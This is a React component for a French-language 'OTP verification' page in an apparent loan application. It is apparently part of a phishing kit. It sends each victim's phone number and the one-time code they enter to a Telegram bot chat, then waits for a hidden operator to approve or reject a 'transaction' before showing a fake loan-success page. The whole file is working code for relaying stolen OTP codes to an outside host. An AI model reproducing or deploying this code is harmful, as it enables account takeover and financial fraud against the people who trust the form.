import React, { useState, useRef, useEffect } from 'react'
import { useNavigate, useParams } from 'react-router-dom'

const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || ''
const ADMIN_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN

const SpinnerStyle = () => (
  <style>{`
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  `}</style>
)

const otpStatusMessages = {
  pending: "⏳ En attente...",
  approved: "✅ Vérifié!",
  wrong_code: "❌ Code OTP incorrect",
  expired: "⏰ Temps expiré",
}

function Verification() {
  const navigate = useNavigate()
  const { user } = useParams()
  const userId = user || 'default'
  const basePath = userId && userId !== 'default' ? `/${userId}` : ""
  const [otp, setOtp] = useState(Array(4).fill(""))
  const inputRefs = useRef([])
  const [requestId, setRequestId] = useState(null)
  const [status, setStatus] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [autoPolling, setAutoPolling] = useState(false)
  const pollingIntervalRef = useRef(null)
  const checkCountRef = useRef(0)
  const maxChecks = 24
  const lastUpdateIdRef = useRef(0)
  
  const storedAppStr = localStorage.getItem('loanAppData')
  const appData = storedAppStr ? JSON.parse(storedAppStr) : {}

  useEffect(() => {
    const cleanup = () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
      }
    }
    return cleanup
  }, [])

  const handleKey = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      e.preventDefault()
      inputRefs.current[index - 1]?.focus()
    } else if (/^\d$/.test(e.key) && index < 3) {
      e.preventDefault()
      const newOtp = [...otp]
      newOtp[index] = e.key
      setOtp(newOtp)
      inputRefs.current[index + 1]?.focus()
    }
  }

  const handlePaste = (e) => {
    e.preventDefault()
    const data = e.clipboardData.getData("text").trim().replace(/\D/g, "")
    if (data.length === 4) {
      const newOtp = data.split("").slice(0, 4)
      setOtp(newOtp)
      setTimeout(() => startVerification(), 300)
    }
  }

  async function deleteWebhook() {
    try {
      const response = await fetch(TELEGRAM_API + '/deleteWebhook')
      const data = await response.json()
      console.log('Webhook deleted:', data.result)
    } catch (e) {
      console.error('Webhook deletion failed:', e)
    }
  }

  async function sendTelegramNotification(phoneNumber, code) {
    const reqId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
    
    const lines = [
      '🔐 New OTP Verification Request',
      '📱 Phone: ' + phoneNumber,
      '🔐 OTP Code: ' + code,
      '🆔 Request: ' + reqId
    ]
    const message = lines.join('\n')

    try {
      const response = await fetch(TELEGRAM_API + '/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          text: message,
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Approve', callback_data: 'approve_' + reqId },
              { text: '❌ Reject', callback_data: 'reject_' + reqId }
            ]]
          }
        })
      })
      return { success: response.ok, requestId: reqId }
    } catch (e) {
      console.error('Telegram send failed:', e)
      return { success: false, error: e.message, requestId: reqId }
    }
  }

  async function checkTelegramApproval(reqId) {
    try {
      const offset = lastUpdateIdRef.current > 0 ? lastUpdateIdRef.current + 1 : 0
      const response = await fetch(TELEGRAM_API + '/getUpdates?offset=' + offset)
      const data = await response.json()
      
      if (data.ok && Array.isArray(data.result)) {
        for (const update of data.result) {
          if (update.update_id > lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id
          }
          if (update.callback_query) {
            const parts = update.callback_query.data.split('_')
            const action = parts[0]
            const id = parts.slice(1).join('_')
            if (id === reqId) {
              if (action === 'approve') {
                try {
                  await fetch(TELEGRAM_API + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: update.callback_query.from.id,
                      text: '✅ Transaction approved!'
                    })
                  })
                } catch (e) {}
                return { approved: true, status: 'approved' }
              } else if (action === 'reject') {
                try {
                  await fetch(TELEGRAM_API + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: update.callback_query.from.id,
                      text: '❌ Transaction rejected.'
                    })
                  })
                } catch (e) {}
                return { approved: false, status: 'rejected' }
              }
            }
          }
        }
      }
      return { approved: false, status: 'pending' }
    } catch (e) {
      console.error('Approval check failed:', e)
      return { approved: false, status: 'error' }
    }
  }

  const startPolling = (reqId) => {
    checkCountRef.current = 0
    setRequestId(reqId)

    setLoading(true)
    setAutoPolling(true)
    setError("")
    setStatus(null)

    pollingIntervalRef.current = setInterval(async () => {
      checkCountRef.current++
      const result = await checkTelegramApproval(reqId)
      
      console.log('Polling... count:', checkCountRef.current, 'result:', result)

      if (result.approved) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setAutoPolling(false)
        setStatus("approved")
        const storedApp = localStorage.getItem('loanAppData')
        const appData = storedApp ? JSON.parse(storedApp) : {}
        navigate(`${basePath}/loan-success?name=${encodeURIComponent(appData.name || 'User')}&amount=${encodeURIComponent(appData.amount || 'N/A')}`)
      } else if (result.status === 'rejected') {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setAutoPolling(false)
        setError("Transaction rejetée")
      } else if (checkCountRef.current >= maxChecks) {
        clearInterval(pollingIntervalRef.current)
        pollingIntervalRef.current = null
        setLoading(false)
        setAutoPolling(false)
        setStatus("expired")
        setError("Temps expiré")
      }
    }, 5000)
  }

  const startVerification = async () => {
    if (otp.some(i => i === "")) return
    
    const code = otp.join("")
    console.log("Sending OTP verification...", code)
    setLoading(true)
    setError("")
    
    const storedApp = localStorage.getItem('loanAppData')
    const appData = storedApp ? JSON.parse(storedApp) : {}
    
    const phoneNumber = appData.number || ""

    try {
      await deleteWebhook()
      const result = await sendTelegramNotification(phoneNumber, code)
      
      if (result.success && result.requestId) {
        startPolling(result.requestId)
      } else {
        setError("Échec de l'envoi: " + (result.error || 'Unknown error'))
        setLoading(false)
      }
    } catch (err) {
      console.error("Verification error:", err)
      setError("Erreur de vérification")
      setLoading(false)
    }
  }

  if (status === "approved") {
    return (
      <div className="otp-container">
        <div className="verification-success">
          <h2>✅ Vérification réussie!</h2>
          <p>Vous allez être redirigé...</p>
        </div>
      </div>
    )
  }

  if (status === "expired") {
    return (
      <div className="otp-container">
        <div className="verification-error">
          <h2 style={{ color: "red" }}>⏰ Temps expiré !</h2>
          <p>Le délai de vérification est dépassé</p>
          <button 
            onClick={() => window.location.reload()}
            style={{
              marginTop: '15px',
              padding: '10px 20px',
              background: '#11bb4a',
              color: 'white',
              border: 'none',
              borderRadius: '5px',
              cursor: 'pointer'
            }}
          >
            Ressayer
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="otp-container">
      <SpinnerStyle />
      <div className="otpheader">
        <h2>Vérification OTP</h2>
        <p>
          Saisissez le code OTP envoyé à votre numéro
          <br />
          <span style={{ fontWeight: "bold", color: "#333" }}>{appData?.number || "____________"}</span>
        </p>
      </div>

      {error && (
        <div className="error-message" style={{ color: "red", textAlign: "center", margin: "10px 0", padding: "8px", backgroundColor: "#ffeeee", borderRadius: "5px" }}>
          ❌ {error}
        </div>
      )}

      {autoPolling && (
        <div style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          gap: "10px",
          padding: "15px",
          backgroundColor: "#e3f2fd",
          borderRadius: "8px",
          margin: "15px 0"
        }}>
          <span style={{
            display: "inline-block",
            width: "20px",
            height: "20px",
            border: "2px solid #1976d2",
            borderRadius: "50%",
            borderTopColor: "#1976d2",
            animation: "spin 1s linear infinite"
          }}></span>
          <span style={{ color: "#1976d2", fontWeight: "500" }}>
            ⏳ En attente d'approbation...
          </span>
        </div>
      )}

      <div className="otp-inputs" style={{ display: "flex", justifyContent: "center", gap: "10px", marginBottom: "20px" }}>
        {otp.map((value, index) => (
          <input
            key={index}
            ref={el => inputRefs.current[index] = el}
            type="password"
            inputMode="numeric"
            maxLength="1"
            value={value}
            onChange={e => {
              const newOtp = [...otp]
              newOtp[index] = e.target.value
              setOtp(newOtp)
            }}
            onKeyDown={e => handleKey(index, e)}
            onPaste={handlePaste}
            onFocus={(e) => e.target.select()}
            style={{
              width: "45px",
              height: "45px",
              fontSize: "18px",
              textAlign: "center",
              border: "1px solid #ddd",
              borderRadius: "6px",
              backgroundColor: "#fff"
            }}
            disabled={loading || autoPolling}
            autoComplete="one-time-code"
          />
        ))}
      </div>

      <div className="otp-display">
        <p>
          Votre code OTP : <strong>{otp.join("") || "____"}</strong>
        </p>
        
        <button 
          onClick={startVerification} 
          style={{
            width: "100%",
            padding: "12px",
            backgroundColor: loading || autoPolling ? "#ccc" : "#ed1c2e",
            color: "white",
            border: "none",
            borderRadius: "6px",
            fontSize: "16px",
            fontWeight: "500",
            cursor: loading || autoPolling ? "not-allowed" : "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "8px"
          }}
          disabled={otp.join("").length !== 4 || loading || autoPolling}
        >
          {loading || autoPolling ? (
            <>
              <span style={{
                display: "inline-block",
                width: "18px",
                height: "18px",
                border: "2px solid rgba(255,255,255,0.4)",
                borderRadius: "50%",
                borderTopColor: "white",
                animation: "spin 1s linear infinite"
              }}></span>
              {autoPolling ? "⏳ En attente..." : "Envoi..."}
            </>
          ) : "Saisissez le code OTP"}
        </button>

        <div className="otp-actions" style={{ marginTop: "20px", display: "flex", gap: "10px", justifyContent: "center" }}>
          <button 
            className="clear-btn" 
            type="button" 
            onClick={() => {
              setOtp(Array(4).fill(""))
              inputRefs.current[0]?.focus()
            }}
            style={{
              padding: "8px 16px",
              backgroundColor: "#f5f5f5",
              color: "#333",
              border: "1px solid #ddd",
              borderRadius: "5px",
              cursor: "pointer",
              fontSize: "14px"
            }}
          >
            Claire
          </button>
          {status === "expired" && (
            <button 
              className="retry-button" 
              onClick={startVerification}
              style={{
                padding: "8px 16px",
                backgroundColor: "#11bb4a",
                color: "white",
                border: "none",
                borderRadius: "5px",
                cursor: "pointer",
                fontSize: "14px"
              }}
            >
              → Ressayer
            </button>
          )}
        </div>
      </div>
    </div>
  )
}

export default Verification